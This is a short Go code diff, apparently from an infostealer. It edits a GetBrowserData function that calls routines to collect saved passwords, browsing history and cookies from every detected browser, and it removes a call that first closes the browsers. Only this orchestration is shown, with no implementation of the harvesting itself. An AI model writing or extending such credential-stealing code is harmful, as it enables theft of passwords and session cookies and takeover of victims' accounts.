@@ -45,7 +45,6 @@ func GetBrowserDownloads(browsers []structs.Browser) {
 }
 
 func GetBrowserData(totalBrowsers []structs.Browser) {
-	util.CloseBrowsers()
 	GetBrowserPasswords(totalBrowsers)
 	GetBrowserHistory(totalBrowsers)
 	GetBrowserCookies(totalBrowsers)
